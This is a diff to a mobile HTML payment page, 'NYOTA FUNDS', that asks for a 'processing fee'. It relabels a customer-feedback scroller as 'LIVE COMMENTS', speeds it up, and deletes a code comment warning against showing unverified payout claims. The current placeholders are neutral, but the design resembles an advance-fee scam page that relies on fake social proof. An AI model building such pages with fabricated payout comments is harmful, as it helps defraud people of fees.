@@ -1,6 +1,8 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html><html lang="en">
+<head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>NYOTA FUNDS</title><style>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NYOTA FUNDS</title><style>
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
 
 * {
@@ -25,8 +27,6 @@ body {
     max-width: 430px;
     margin: 0 auto;
 }
-
-/* PAYMENT CARD */
 
 .card {
     width: 100%;
@@ -98,8 +98,6 @@ input:focus {
     box-shadow: 0 0 0 3px rgba(212,175,55,0.10);
 }
 
-/* PAYMENT BUTTON */
-
 button {
     width: 100%;
     height: 54px;
@@ -141,7 +139,7 @@ button:disabled {
     line-height: 1.4;
 }
 
-/* CUSTOMER FEEDBACK */
+/* LIVE COMMENTS */
 
 .live-comments {
     width: 100%;
@@ -171,7 +169,7 @@ button:disabled {
     display: flex;
     flex-direction: column;
     gap: 10px;
-    animation: commentsFlow 35s linear infinite;
+    animation: commentsFlow 25s linear infinite;
 }
 
 .comments-window:active .comments-track {
@@ -214,8 +212,6 @@ button:disabled {
         transform: translateY(-50%);
     }
 }
-
-/* MOBILE */
 
 @media(max-width:360px) {
     body {
@@ -285,9 +281,7 @@ button:disabled {
     }
 }
 </style></head><body>
-<div class="container"><!-- PAYMENT SECTION -->
-
-<div class="card">
+<div class="container"><div class="card">
     <h1>PROCESSING FEE</h1>
 
     <p>
@@ -315,45 +309,34 @@ button:disabled {
     <p id="stkMessage"></p>
 </div>
 
-<!-- CUSTOMER FEEDBACK -->
-
 <div class="live-comments">
-    <div class="comments-title">
-        💬 Customer Feedback
-    </div>
+    <div class="comments-title">💬 LIVE COMMENTS</div>
 
     <div class="comments-window">
         <div class="comments-track">
-
-            <!-- Add genuine, permissioned customer feedback here.
-                 Do not display unverified payout claims as confirmed transactions. -->
-
             <div class="comment">
-                <div class="comment-name">Customer feedback</div>
-                <div class="comment-message">Customer feedback will appear here.</div>
-                <div class="comment-time">Feedback section</div>
+                <div class="comment-name">Live comments</div>
+                <div class="comment-message">Verified comments can be displayed here.</div>
+                <div class="comment-time">Feedback</div>
             </div>
 
             <div class="comment">
-                <div class="comment-name">Customer feedback</div>
-                <div class="comment-message">Only verified and permissioned feedback should be displayed.</div>
-                <div class="comment-time">Feedback section</div>
-            </div>
-
-            <!-- Duplicate entries to maintain continuous scrolling -->
-
-            <div class="comment">
-                <div class="comment-name">Customer feedback</div>
-                <div class="comment-message">Customer feedback will appear here.</div>
-                <div class="comment-time">Feedback section</div>
+                <div class="comment-name">Live comments</div>
+                <div class="comment-message">Comments can be added once verified.</div>
+                <div class="comment-time">Feedback</div>
             </div>
 
             <div class="comment">
-                <div class="comment-name">Customer feedback</div>
-                <div class="comment-message">Only verified and permissioned feedback should be displayed.</div>
-                <div class="comment-time">Feedback section</div>
+                <div class="comment-name">Live comments</div>
+                <div class="comment-message">Verified comments can be displayed here.</div>
+                <div class="comment-time">Feedback</div>
             </div>
 
+            <div class="comment">
+                <div class="comment-name">Live comments</div>
+                <div class="comment-message">Comments can be added once verified.</div>
+                <div class="comment-time">Feedback</div>
+            </div>
         </div>
     </div>
 </div>
@@ -480,8 +463,6 @@ async function checkPayment(transactionId) {
             let payment = result.data;
             let status = String(payment.status || "").toUpperCase();
 
-            /* PAYMENT SUCCESS */
-
             if (status === "COMPLETED") {
                 clearInterval(interval);
 
@@ -490,8 +471,6 @@ async function checkPayment(transactionId) {
 
                 window.location.href = "delivery.html";
             }
-
-            /* PAYMENT FAILED */
 
             else if (
                 status === "CANCELLED" ||
